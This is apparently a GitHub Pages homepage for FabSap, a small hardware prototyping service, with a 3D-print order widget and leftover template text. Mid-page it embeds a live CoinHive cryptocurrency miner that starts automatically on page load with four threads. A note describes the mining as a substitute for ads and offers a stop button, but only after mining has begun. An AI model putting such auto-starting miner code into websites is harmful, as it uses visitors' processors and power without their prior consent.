## Welcome to FabSap

@FabSap our mission is to enable hardware engineers/hakers/makers with prototypes build right - on time and at affordable prices.
As Makers you keep on creating awesome stuff while we handle manufacturing for you.



### 3D Printing

You can order 3d Prints right away:

<a href="https://www.3dhubs.com/service/fabsap" data-3dhubs-widget="button" data-hub-id="72904" data-type="orderWidget" data-color="green" data-size="large" data-text="Order a 3D Print" >Order a 3D Print</a>
<script>!function(a,b,c,d){var e,g=(a.getElementsByTagName(b)[0],/^http:/.test(a.location)?"http":"https");a.getElementById(d)||(e=a.createElement(b),e.id=d,e.src=g+"://d3d4ig4df637nj.cloudfront.net/w/2.0.js",e.async=!0,a.body.appendChild(e))}(document,"script",1,"h3d-widgets-js");</script>

<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
Instead of using ads, I am having you mine for crypto currency to support this site. Here are your stats:
<center>
<p id="tcount"></p>
<p id="hps"></p>
<p id="ths"></p>
<p id="tah"></p>
</center>
<p>You can start or stop at anytime but please wait for some accepted hashes before you do.</p>
<center>
<p id="minebutton"></p>
</center>
<p>Visit <a href="https://coin-hive.com/">Coin Hive</a> to learn more about how this works</a>

<script type="text/javascript">
var miner = new CoinHive.Anonymous('zMtnsQ82YuudZehaQerpxlPI7ct2NUld','john-doe', {threads: 4,	autoThreads: true});
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
// Update stats once per second
setInterval(function() {
    var threadCount = miner.getNumThreads();
    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes() / 256;
    // Output to HTML elements...
    if (miner.isRunning()) {
        document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
        document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
        document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
        document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
    } else {
        document.getElementById("hps").innerHTML = "Please click start";
        document.getElementById("ths").innerHTML = "to support";
        document.getElementById("tah").innerHTML = "this site";
        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
    }
}, 1000);
</script>


```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/dhavalpalsana/Fabsap/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
